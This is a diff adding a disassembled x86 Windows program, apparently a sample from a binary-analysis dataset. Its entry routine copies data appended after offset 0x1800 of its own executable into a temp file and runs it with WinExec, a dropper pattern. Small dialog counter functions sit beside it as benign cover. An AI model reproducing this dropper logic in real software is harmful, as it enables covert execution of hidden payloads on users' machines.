@@ -1,0 +1,123 @@
+_start
+push ebp
+mov ebp esp
+add esp 0xfffffc00
+cmp [ ebp + 0xc ] 0x0
+jne r-xdata
+mov eax 0x1
+leave
+retn 0xc
+push 0x104
+push rw-data
+push [ ebp + 0x8 ]
+call GetModuleFileNameA
+push rw-data
+push 0x104
+call GetTempPathA
+push rw-data
+push 0x0
+push rw-data
+push rw-data
+call GetTempFileNameA
+push 0x0
+push 0x80
+push 0x4
+push 0x0
+push 0x1
+push 0x80000000
+push rw-data
+call CreateFileA
+mov [ rw-data ] eax
+push 0x0
+push 0x80
+push 0x2
+push 0x0
+push 0x3
+push 0xc0000000
+push rw-data
+call CreateFileA
+mov [ rw-data ] eax
+push 0x0
+push 0x0
+push 0x1800
+push [ rw-data ]
+call SetFilePointer
+jmp r-xdata
+jmp r-xdata
+push 0x0
+push rw-data
+push 0x400
+lea eax [ ebp - 0x400 ]
+push eax
+push [ rw-data ]
+call ReadFile
+push 0x0
+push rw-data
+push [ rw-data ]
+lea eax [ ebp - 0x400 ]
+push eax
+push [ rw-data ]
+call WriteFile
+cmp [ rw-data ] 0x400
+jae r-xdata
+push [ rw-data ]
+call CloseHandle
+push [ rw-data ]
+call CloseHandle
+push 0x0
+push rw-data
+call WinExec
+AddVal
+push ebp
+mov ebp esp
+push 0x0
+push 0x0
+push [ ebp + 0xc ]
+push [ ebp + 0x8 ]
+call GetDlgItemInt
+inc eax
+push 0x1
+push eax
+push [ ebp + 0xc ]
+push [ ebp + 0x8 ]
+call SetDlgItemInt
+leave
+retn 0x8
+DecVal
+push ebp
+mov ebp esp
+push 0x0
+push 0x0
+push [ ebp + 0xc ]
+push [ ebp + 0x8 ]
+call GetDlgItemInt
+dec eax
+push 0x1
+push eax
+push [ ebp + 0xc ]
+push [ ebp + 0x8 ]
+call SetDlgItemInt
+leave
+retn 0x8
+GetDlgItemInt
+jmp [ GetDlgItemInt@IAT ]
+SetDlgItemInt
+jmp [ SetDlgItemInt@IAT ]
+CloseHandle
+jmp [ CloseHandle@IAT ]
+CreateFileA
+jmp [ CreateFileA@IAT ]
+GetModuleFileNameA
+jmp [ GetModuleFileNameA@IAT ]
+GetTempFileNameA
+jmp [ GetTempFileNameA@IAT ]
+GetTempPathA
+jmp [ GetTempPathA@IAT ]
+ReadFile
+jmp [ ReadFile@IAT ]
+SetFilePointer
+jmp [ SetFilePointer@IAT ]
+WinExec
+jmp [ WinExec@IAT ]
+WriteFile
+jmp [ WriteFile@IAT ]
